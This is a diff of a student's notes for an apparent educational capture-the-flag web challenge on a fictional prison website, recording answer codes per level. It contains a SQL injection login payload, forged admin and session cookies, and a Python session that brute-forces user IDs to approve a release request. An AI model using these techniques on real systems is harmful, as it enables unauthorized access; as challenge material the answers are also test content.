@@ -1,11 +1,11 @@
 lvl 1 - sql injection
 NovotnyP
 ' or '1'='1
-prx1234653823d
+odpoved: prx1234653823d
 
 lvl 2 - cookies
 userRole admin
-C93Ldd02DFvcx
+odpoved: C93Ldd02DFvcx
 
 lvl 3
 
@@ -31,3 +31,79 @@ Detailní popis zločinu:
 
 Dne 17.12.2021 byl detekován nepovolený vstup na servery společnosti makro.cz, kde byla vytvořena neutorizovaná objednávka 2 tun nejlepších severských ryb, která byla označena jako zaplacená, přesto že jakákoliv platba doposud neproběhla. Podle záznamů z logů na serveru byl útok proveden z terminálu, který po identifikaci byl přiřazen právě Karlíku Tučňatému. Dále byl ze stejného terminálu proveden útok na servery společnosti alza.cz, kde útočník zašifroval všechny vytvořené propagační materiály, a způsobil tak společnosti odhadovanou škodu přibližně 39.2 milionů euro.
 FOUND 15992410 b'\x00\xf1\xf4\x06ZKar'
+
+odpoved: adfe-kf32-32gh-dh7j
+
+
+lvl 4
+- pozri si blizsie aky request posiela na server a ake su v nom data
+
+Žádost o propuštění
+Kód vězňa: adfe-kf32-32gh-dh7j
+
+Autor: NovotnyP
+
+Vytvořeno: 6. 1. 2022, 14:59:54
+
+Schváleno
+
+Schváleno uživatelem: KoudlekaJ
+
+Čas schválení: 6. 1. 2022, 15:05:37
+
+Validační kód: e7383b62102e
+
+Důvod žádosti
+
+nevinny
+
+
+"C:\Users\Lubomir Jurcisin\AppData\Local\Microsoft\WindowsApps\python3.8.exe" "C:\Program Files\JetBrains\PyCharm Community Edition 2021.2.1\plugins\python-ce\helpers\pydev\pydevconsole.py" --mode=client --port=59097
+import sys; print('Python %s on %s' % (sys.version, sys.platform))
+sys.path.extend(['E:\\Lubomir Jurcisin\\LubomirJurcisin\\Gymnázium\\4. ročník\\KSI', 'E:/Lubomir Jurcisin/LubomirJurcisin/Gymnázium/4. ročník/KSI'])
+PyDev console: starting.
+Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)] on win32
+import requests
+prihlasenie = {}
+prihlasenie = {"userName": "NovotnyP", "pwd": "' or '1'='1"}
+session = requests.Session()
+prihlasit = session.post("https://prison.stastnyjakub.com/login", data=prihlasenie)
+get_response = session.get("https://prison.stastnyjakub.com/")
+print(get_response)
+<Response [200]>
+print(session.get("https://prison.stastnyjakub.com/Prisoners"))
+<Response [200]>
+print(session.cookies)
+<RequestsCookieJar[]>
+print(session.post("https://api.prison.stastnyjakub.com/Prisoners", data={"userRole": "admin"}))
+<Response [404]>
+print(session.get("https://prison.stastnyjakub.com/Prisoners", data={"userRole": "admin"}))
+<Response [200]>
+print(session.get("https://prison.stastnyjakub.com/ReleaseRequests", data={"userRole": "admin"}))
+<Response [200]>
+session.cookies.set("userRole", "admin", domain="api.prison.stastnyjakub.com")
+Cookie(version=0, name='userRole', value='admin', port=None, port_specified=False, domain='api.prison.stastnyjakub.com', domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
+session.cookies.set("userRole", "admin", domain="prison.stastnyjakub.com")
+Cookie(version=0, name='userRole', value='admin', port=None, port_specified=False, domain='prison.stastnyjakub.com', domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
+session.cookies.set("PHPSESSID", "d38vucb3s0f3cps99d1vpga1n8", domain="api.prison.stastnyjakub.com")
+Cookie(version=0, name='PHPSESSID', value='d38vucb3s0f3cps99d1vpga1n8', port=None, port_specified=False, domain='api.prison.stastnyjakub.com', domain_specified=True, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
+print(session.get("https://prison.stastnyjakub.com/ReleaseRequests"))
+<Response [200]>
+print(session.post("https://api.prison.stastnyjakub.com/releaseRequests/approveRequest.php", data={"requestId": 0, "userId": 219}))
+<Response [401]>
+for i in range(500):
+    print(session.post("https://api.prison.stastnyjakub.com/releaseRequests/approveRequest.php",
+                       data={"requestId": 0, "userId": i}))
+
+<Response [401]>
+...
+<Response [401]>
+<Response [200]>  # tento to schvalil, cca userId=480
+<Response [401]>
+...
+<Response [401]>
+print(session.cookies)
+<RequestsCookieJar[<Cookie PHPSESSID=d38vucb3s0f3cps99d1vpga1n8 for api.prison.stastnyjakub.com/>, <Cookie userRole=admin for api.prison.stastnyjakub.com/>, <Cookie userRole=admin for prison.stastnyjakub.com/>]>
+
+refreshnut stranku v prehliadaci a hotov:
+odpoved: e7383b62102e
